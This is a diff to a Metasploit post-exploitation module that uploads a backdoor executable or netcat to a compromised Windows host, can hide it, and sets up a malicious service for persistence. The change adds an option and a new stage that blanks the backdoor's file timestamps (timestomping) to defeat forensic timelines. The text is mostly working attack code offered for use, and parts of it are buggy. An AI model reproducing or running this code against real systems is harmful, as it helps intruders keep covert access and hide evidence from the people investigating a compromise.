@@ -37,6 +37,7 @@
 # The full path (local) of payload to be uploaded => set LOCAL_PATH /root/payload.exe
 #
 # [ MODULE ADVANCED OPTIONS ]
+# Blank remote backdoor timestomp attributs?      => set BLANK_TIMESTOMP true
 # Use attrib to hide your payload.exe?            => set HIDDEN_ATTRIB true
 # Check malicious service settings?               => set SERVICE_STATUS true
 # Delete malicious service?                       => set DEL_SERVICE true
@@ -112,8 +113,8 @@ class MetasploitModule < Msf::Post
                                         'SpecialThanks: Fatima Ferreira | Chaitanya', # collaborators
                                 ],
  
-                        'Version'        => '$Revision: 2.0',
-                        'DisclosureDate' => 'nov 13 2016',
+                        'Version'        => '$Revision: 2.1',
+                        'DisclosureDate' => 'nov 18 2016',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'true',
@@ -155,6 +156,7 @@ class MetasploitModule < Msf::Post
                                 OptString.new('NC_LPORT', [ false, 'The LPORT to use (netcat only)']),
                                 OptBool.new('USE_NETCAT', [ false, 'Deploy netcat (nc.exe) insted of payload.exe?' , false]),
                                 OptBool.new('HIDDEN_ATTRIB', [ false, 'Use Attrib command to Hide payload.exe?' , false]),
+                                OptBool.new('BLANK_TIMESTOMP', [ false, 'Blank remote backdoor timestomp attributs?' , false]),
                                 OptBool.new('SERVICE_STATUS', [ false, 'Check malicious service settings?' , false]),
                                 OptBool.new('DEL_SERVICE', [ false, 'Delete malicious service?' , false])
                         ], self.class) 
@@ -213,19 +215,6 @@ def ls_stage1
         # upload our executable into target system..
         print_good(" Uploading #{p_name} agent...")
         client.fs.file.upload("#{d_path}\\#{p_name}","#{u_path}")
-
-
-        # check if remote path exists?
-        bin_path = "#{d_path}\\#{p_name}"
-        if bin_path.nil?
-          print_error("ABORT: post-module cant find backdoor binary...")
-          print_error("Please check: #{bin_path}")
-          return nil
-        end
-
-        # Change payload timestamp (date:time)
-        print_good(" Blank backdoor agent timestamp...")
-        client.priv.fs.blank_file_mace("#{d_path}\\#{p_name}")
         sleep(1.0)
 
 
@@ -501,6 +490,57 @@ end
 
 
 
+# -------------------------------
+# BLANK BACKDOOR TIMESTOMP VALUES
+# -------------------------------
+def ls_stage5
+
+  r=''
+  session = client
+  d_path = datastore['DEPLOY_PATH']  # %userprofile%
+  p_name = datastore['PAYLOAD_NAME'] # payload.exe
+  # check for proper config settings enter
+  # to prevent 'unset all' from deleting default options...
+  if datastore['DEPLOY_PATH'] == 'nil' || datastore['PAYLOAD_NAME'] == 'nil'
+    print_error("Options not configurated correctly...")
+    print_warning("Please set DEPLOY_PATH | PAYLOAD_NAME options!")
+    return nil
+  else
+    print_status("Blank backdoor timestamp attributes!")
+    sleep(1.5)
+  end
+
+
+    # check if backdoor.exe exist in target
+    if client.fs.file.exist?("#{d_path}\\#{p_name}")
+      print_good(" Backdoor agent: #{p_name} found!")
+      sleep(1.5)
+
+      # Change payload timestamp (date:time)
+      print_good(" Blanking backdoor agent timestamp...")
+      client.priv.fs.blank_file_mace("#{d_path}\\#{p_name}")
+      sleep(1.5)
+
+        # diplay output to user
+        print_status("#{p_name} timestomp successefully blanked!")
+        print_line("")
+
+      # close channel when done
+      r.channel.close
+      r.close
+
+    else
+      print_error("ABORT: post-module cant find backdoor agent path...")
+      print_error("BACKDOOR_AGENT: #{d_path}\\#{p_name}")
+      print_line("")
+    end
+
+
+  # error exception funtion
+  rescue ::Exception => e
+  print_error("Error: #{e.class} #{e}")
+end
+
 
 # ------------------------------------------------
 # MAIN DISPLAY WINDOWS (ALL MODULES - def run)
@@ -565,6 +605,10 @@ def run
 
       if datastore['SERVICE_STATUS']
          ls_stage4
+      end
+
+      if datastore['BLANK_TIMESTOMP']
+         ls_stage5
       end
 
    end
